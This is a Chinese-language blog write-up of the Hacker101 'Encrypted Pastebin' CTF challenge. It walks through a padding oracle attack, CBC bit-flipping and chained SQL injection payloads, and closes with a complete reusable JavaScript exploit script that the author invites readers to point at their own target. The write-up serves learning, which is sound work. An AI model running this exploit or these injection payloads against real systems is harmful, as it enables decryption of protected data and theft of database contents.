---
title: Hacker 101 CTF Write Up Part 6 - Encrypted Pastebin (Padding Oracle 以及翻轉攻擊)
categories: Security
date: 2019-10-20 21:08:38
tags: [CTF, security]
header-img: /images/banner.jpg
catalog: true
---

# Encrypted Pastebin

這題總共有四個 flag

<!-- more -->

## 0x00

一開始畫面長這樣  
![](/images/ctf/part6-aes-1-01.png)

試著輸入值之後，發現上面有一段 `?post=` 資料  
![](/images/ctf/part6-aes-1-02.png)

嘗試更改之後，發現 flag  
![](/images/ctf/part6-aes-1-03.png)


## 0x01

根據上一個 error message 得知有用到 base64  
所以可以知道 `?post=` 的是 base64  
接下來再輸入一些奇怪的值試試看  
![](/images/ctf/part6-aes-2-01.png)

發現程式使用的是 aes-128-cbc 去把資料作加密  
且根據錯誤訊息表示 IV 要為 16 bytes，代表 post 是需要帶入 IV 進去的  
那根據[這篇](https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/)解釋 aes 加解密以及存在的 padding oracle 攻擊  
得知透過修改 iv 可以對解密後的資料做 XOR，進而達到目標 payload  
主要公式如下:  
```
// new_iv 為攻擊者構造的 iv
// iv 為原本的 iv
// plain 為明文
// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload
公式 1: plain[i] = middle[i] XOR iv[i]
公式 2: 0x01 = middle[i] XOR new_iv[i]
公式 3: middle[i] = 0x01 XOR new_iv[i]
公式 4: plain[i]= 0x01 XOR new_iv[i] XOR iv[i]
```
透過以上公式可以推斷出明文，這邊用 16bytes 去排版，方便後續說明
```
{"flag": "^FLAG^
a38f2d9e2659df72
12c341bc01a2cf82
8c7d663978eb476a
c6d664a03f49c08c
$FLAG$", "id": "
3", "key": "rTU2
s8qRJ4uRRdLFJbt-
YA~~"}\n\n\n\n\n\n\n\n\n\n
```

## 0x02  

因為上一題有發現 id 為 3   
於是開始繼續利用上一個 flag 提到的文章裡面的翻轉攻擊去修改解密後的明文  
```
// new_iv 為攻擊者構造的 iv
// iv 為原本的 iv
// plain 為明文
// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload
// 'x' 為我們想要把解密後的值透過 xor 後變成的結果
公式 1: plain[i] = middle[i] XOR iv[i]
公式 2: 'x' = middle[i] XOR new_iv[i]
公式 3: 'x' XOR new_iv[i] XOR iv[i] = plain[i]
公式 4: new_iv[i] = plain[i] XOR 'x' XOR iv[i]
```

透過上面公式可以去修改原本的 payload  
這裡我們先只拿第一段來做修改，先省略掉其他 payload  
```
原本 iv: 05694ed4efacf438e310a4fc54ff2826
原本明文: {"flag": "^FLAG^
預期明文: {"id": "1"}\x05\x05\x05\x05\x05 (記得不夠是要 padding value)

原本的值: 05694ed4efacf438e310a4fc54ff28265a813ad8376339531ea70324a0ce85c8
更改後的: 056941dcacf1f620f21087bf1dbb6a7d5a813ad8376339531ea70324a0ce85c8
```
上面可以發現前面 32 bytes 的 iv 已經變了  
把這個 payload 塞回去得到下面得結果  
![](/images/ctf/part6-aes-3-01.png)

果然 QQ，原本以為還是要有 key 才能去解開，不能只單純改 id  
因為原本 id 在第 7 個 block  
所以改了第 6 個的 block，讓 id 所在的 block 從 3 -> 1  
但改了第 6 個的 block，解密出來一定會有問題  
所以要先知道改了第 6 個 block 後的明文，再去回推第 5 個 block 應該要什麼值  
才能讓更改後的第 6 個 block XOR 後才能解回原本應有的值  
以此類推，要更改到最面的 iv block 才算完成  
但全部改完之後出現下面訊息，看來跟上面直接改 id 是一樣的    
看來 key 是拿去做進一層解密內容使用，所以直接改 id 不需要 key 就可以了，有點白做了 XD  
![](/images/ctf/part6-aes-3-02.png)

## 0x03

這一題試著把 id 改成單引號發生一件事情  
![](/images/ctf/part6-aes-4-01.png)
SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的  
至於為什麼要用 SQL Injection 的原因是因為前一個 flag 只有顯示 title，但內容因為 key 問題所以沒有顯示出來  
所以只能透過 SQL Injection 去 dump 出資料庫看看有什麼可以幫助解開前一個 flag 的內容  
大概是長下面的樣子，透過替換掉前面的 FLAG 達到更換 id 以及保留 key 的值  
```
{"id": "9 union 
all select datab
ase(),user()", "
aa": "xxxxxxxxxx
c6d664a03f49c08c
$FLAG$", "bb": "
3", "key": "rTU2
s8qRJ4uRRdLFJbt-
YA~~"}
```

這樣就 dump 出 database 的資訊了(level3 以及 root@localhost 那個)  
![](/images/ctf/part6-aes-4-02.png)
![](/images/ctf/part6-aes-4-03.png)

再來 dump 出 tables  
![](/images/ctf/part6-aes-4-04.png)

dump 出 columns  
![](/images/ctf/part6-aes-4-05.png)

透過 dump 出來的 tables 和 columns，去把 tracking 列出資料來  
![](/images/ctf/part6-aes-4-06.png)

發現有一筆資料是對 localhost 運行的結果  
把 post= 後面的值帶到瀏覽器後發現 flag4 (黑色大標是 flag3，下面小字為內容才是 flag4)  
![](/images/ctf/part6-aes-4-07.png)

下面整理當時寫出來的 SQL Injection 搭配 Padding Oracle 程式碼 (有點亂 XD)  
程式基本邏輯為下:  
1. 透過 padding oracle 找到原本明文  
2. 透過翻轉攻擊構造假 iv 達到預期目標的明文  
3. 解完最右邊那一個 block 後，繼續慢慢往左邊一次解一個 block 解下去  

要注意的地方是最外層的 for 迴圈一定要從第 9 個往下遞減跑下去  
每次跑完如果 request 量太多的導致中斷連線的話  
會顯示下一個要解的 block，以及下一個 payload 應該帶什麼，去防止中斷  
因為這邊是直接一次 call 256 的 request 去找比較快，所以很容易斷 XD  
最後面要注意的是 wantedPlainText 一定要是 16 bytes 唯一組才可以  

想要直接使用這個程式碼的直接改兩個大點即可
1. originalPayload 的那一段 base64 改成正常 request 的 base64  
2. 把 `http://34.74.105.127/548dbda597/?post=` 改成你自己的即可  

```javascript
const getPayload = (paddingOracleValue, paddingValue, answer) => {
    answer.reverse()
    answer[paddingOracleValue] = paddingValue
    answer.reverse()
    return answer.toString('hex')
}

const setBlock = (allBlocks, targetBlock, paddingOracleValue, paddingValue, answer) => {
    const startPosition = targetBlock * 32;
    const previousBlockEndPosition = startPosition - 32;
    let first = allBlocks.substring(0, previousBlockEndPosition);
    let end = allBlocks.substring(startPosition);
    return first + getPayload(paddingOracleValue, paddingValue, answer) + end;
}

const encodeHexToBase64 = (payload) => {
    return Buffer.from(payload, 'hex').toString('base64').replace(/\=/g, '~').replace(/\//g, "!").replace(/\+/g, "-")
}

const decodeBase64ToHex = (payload) => {
    return Buffer.from(payload.replace(/\~/g, '=').replace(/\!/g, "/").replace(/\-/g, "+"), 'base64').toString('hex')
}

(async () => {
    const axios = require('axios');
    // original
    let originalPayload = decodeBase64ToHex("H6KJsPhBWKtdEt3LZnTuf8K5!-B69-TxsTNIze9!0Wrss6wGzNUKwi-aaz8WfDVnBrb2UsO7tuAhRej9F05Fexm6MihRiLDQO1vNGPdAgGZAWo11!Mw1tAdnhvdOZra3gJ99qA1adxSD!s97jVbcizRIXZ!MHVKw4jVNAplCiqzYtXJNNhxCXsJIPRKDptSLgukPWBN!wEY2e1nCQPYVrQ~~");
    for (let i = 3; i > 0; i--) {
        let block = i
        let plain = []
        let plainText = [];
        let rawPayload = originalPayload.substring(0, (block + 1) * 32)
        let previousIv = originalPayload.substring((block - 1) * 32, (block) * 32)
        let answer = Buffer.from("00000000000000000000000000000000", 'hex');
        for (let paddingOracleValue = 0; paddingOracleValue < 16; paddingOracleValue++) {
            let job = []
            for (let index = 0; index < 256; index++) {
                let paddingValue = index;
                let blocksToBeDecrypt = setBlock(rawPayload, block, paddingOracleValue, paddingValue, answer)
                payload = encodeHexToBase64(blocksToBeDecrypt)
                job.push(axios.get(`http://34.74.105.127/548dbda597/?post=${payload}`))
            }
            let results = await Promise.all(job).catch((error) => {
                console.log(error)
            })
            for (let index = 0; index < results.length; index++) {
                let paddingValue = index;
                if (!results[index].data.includes('PaddingException')) {
                    let originalIv = Buffer.from(rawPayload, 'hex')
                    let tempPlainText = paddingValue ^ (paddingOracleValue + 1);
                    plainText.push(tempPlainText);
                    plain.unshift(Buffer.from([tempPlainText ^ originalIv[(block) * 16 - 1 - paddingOracleValue]]).toString('hex'))
                    answer.reverse()
                    let nextPaddingOracleValue = (paddingOracleValue + 2);
                    for (let index = 0; index < plainText.length; index++) {
                        answer[index] = plainText[index] ^ nextPaddingOracleValue;
                    }
                    answer.reverse()
                    console.log(plain);
                    break;
                }
            }
        }
        const wantedPlainText = [
            '{"id": "9 union ',
            'all select group',
            '_concat(headers)',
            ' ,2 FROM trackin',
            'g", "b": "bbbbbb',
            'bbbbbbbbbbbbbbbb',
            'bbbbbbbbbbbbbbbb',
            'bbb", "bbbbbb":"',
            'YA~~"}\n\n\n\n\n\n\n\n\n\n'
        ]
        const originalIv = Buffer.from(previousIv, 'hex')
        const change = plain.map(item => parseInt(item, 16))
        console.log('old: ' + Buffer.from(change).toString());
        console.log('new: ' + wantedPlainText[block - 1]);
        const originPlainText = Buffer.from(change)
        const wanttedPlainText = Buffer.from(wantedPlainText[block - 1])
        const wanttedIv = []
        for (let index = 0; index < wanttedPlainText.length; index++) {
            wanttedIv.push(originalIv[index] ^ originPlainText[index] ^ wanttedPlainText[index])
        }
        let newIv = Buffer.from(wanttedIv).toString('hex')
        let part1 = originalPayload.substring(0, (block - 1) * 32);
        let part3 = originalPayload.substring((block) * 32);
        originalPayload = `${part1}${newIv}${part3}`
        console.log(`replaced block: ${block}`);
        console.log(`next block: ${block - 1}`);
        console.log(`new payload: ${encodeHexToBase64(originalPayload)}`);
    }
    axios.get(`http://34.74.105.127/548dbda597/?post=${encodeHexToBase64(originalPayload)}`).then((response) => {
        console.log(response.data)
    })
})();
```

# 後記

這題花了我很多時間解決 XD  
本來想說最後的 SQL Injection 就不要解了，反正大概知道怎麼弄  
但還是很想把它解出來，所以就還是想辦法透過程式自動化去找到最後的 flag  
只是過程中一直修改 wantedPlainText 再加上還會一直斷線真的是有夠麻煩 XD  